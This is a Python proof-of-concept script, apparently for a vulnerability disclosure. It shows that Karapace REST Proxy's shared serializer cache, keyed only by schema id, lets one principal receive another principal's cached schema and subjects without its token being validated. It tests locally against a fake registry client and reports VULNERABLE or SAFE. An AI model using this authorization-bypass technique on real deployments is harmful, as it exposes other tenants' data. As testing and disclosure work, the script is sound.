#!/usr/bin/env python3
"""
PoC: REST Proxy shared SchemaRegistrySerializer cache is not partitioned by caller
identity, so a schema-by-id lookup can be served from another principal's cache entry
without the second caller's token being validated by the Schema Registry.

Background
----------
KafkaRest creates ONE SchemaRegistrySerializer (kafka_rest_apis/__init__.py) and hands
that same instance to every per-user UserRestProxy. The serializer's caches
(ids_to_schemas / ids_to_subjects / schemas_to_ids) are keyed by schema id only and are
shared across all users. They sit ABOVE the SchemaRegistryClient LRU that IS partitioned
by _token_fingerprint(). On the consume/deserialize path (get_schema_for_id with
need_new_call=None) a cache hit returns immediately, so the token-forwarding SR call that
would enforce per-request authorization never happens for the second principal.

This drives the REAL SchemaRegistrySerializer.get_schema_for_id and replaces only the
outbound registry_client with a fake that records which bearer token (from
sr_authorization_ctx) each call forwards. It shows the second principal's request for an
already-cached id never reaches SR.

Usage:
    PYTHONPATH=src python3 poc/karapace_serializer_cache_poc.py
"""

from __future__ import annotations

import asyncio
import sys
import types


def _install_stubs_for_bare_env() -> None:
    """In a full Karapace install this is a no-op. In a bare env the avro fork and the
    compiled protopace shared library are absent; stub the modules the cache path does not
    exercise so the REAL serializer module can be imported."""

    def stub(name, **attrs):
        m = types.ModuleType(name)
        for k, v in attrs.items():
            setattr(m, k, v)
        sys.modules[name] = m
        return m

    stub("karapace.core.stats", StatsClient=type("StatsClient", (), {}))
    stub("karapace.core.protobuf.protopace")  # parent package; skip its __init__
    stub(
        "karapace.core.protobuf.protopace.protopace",
        Proto=type("Proto", (), {}),
        IncompatibleError=type("IncompatibleError", (Exception,), {}),
        check_compatibility=lambda *a, **k: None,
        format_proto=lambda *a, **k: None,
    )


try:
    from karapace.core.config import Config
    from karapace.core.serialization import SchemaRegistrySerializer, sr_authorization_ctx
except (ImportError, FileNotFoundError):
    _install_stubs_for_bare_env()
    from karapace.core.config import Config
    from karapace.core.serialization import SchemaRegistrySerializer, sr_authorization_ctx


class _FakeSchema:
    def __init__(self, label: str) -> None:
        self.label = label

    def __str__(self) -> str:
        return self.label


class _FakeRegistryClient:
    """Stands in for SchemaRegistryClient. Its get_schema_for_id is the token-forwarding
    call to the Schema Registry; here it records which token each call would forward."""

    def __init__(self) -> None:
        self.calls: list[tuple[int, str | None]] = []

    async def get_schema_for_id(self, schema_id):
        token = sr_authorization_ctx.get()
        self.calls.append((int(schema_id), token))
        # SR would authorize `token` for this id here; we return a per-principal marker.
        return _FakeSchema(f"schema#{schema_id}(returned-to {token})"), [f"Subject:owned-by-{token}"]

    async def close(self):  # pragma: no cover
        pass


async def main() -> int:
    serializer = SchemaRegistrySerializer(config=Config())
    fake = _FakeRegistryClient()
    serializer.registry_client = fake  # replace outbound client; drive the real cache logic

    # Principal A (authorized for schema #5) consumes a message -> warms the shared cache.
    sr_authorization_ctx.set("tokenA")
    a_schema, a_subjects = await serializer.get_schema_for_id(5)

    # Principal B (a different bearer) consumes a message that references schema #5.
    sr_authorization_ctx.set("tokenB")
    b_schema, b_subjects = await serializer.get_schema_for_id(5)

    # Control: B asks for an id that is NOT cached yet -> SR IS consulted with B's token.
    b_fresh, _ = await serializer.get_schema_for_id(6)

    print("Outbound SR calls (schema_id, forwarded_token):")
    for cid, tok in fake.calls:
        print(f"    id={cid}  token={tok!r}")
    print()
    print(f"A (tokenA) received: {a_schema}   subjects={a_subjects}")
    print(f"B (tokenB) received: {b_schema}   subjects={b_subjects}")
    print()

    b5_reached_sr = any(call == (5, "tokenB") for call in fake.calls)
    b_got_As_entry = str(b_schema) == str(a_schema)

    print(f"B's lookup of the cached id=5 reached SR with B's token : {b5_reached_sr}")
    print(f"B received principal A's cached schema entry verbatim    : {b_got_As_entry}")
    print(f"Control — B's lookup of uncached id=6 reached SR         : {any(c == (6, 'tokenB') for c in fake.calls)}")
    print()

    if b_got_As_entry and not b5_reached_sr:
        print("RESULT: VULNERABLE — shared serializer cache served A's schema to B without")
        print("        validating B's token at the Schema Registry (cache keyed by id only).")
        return 1
    print("RESULT: SAFE — every principal's schema-by-id lookup is validated / partitioned.")
    return 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
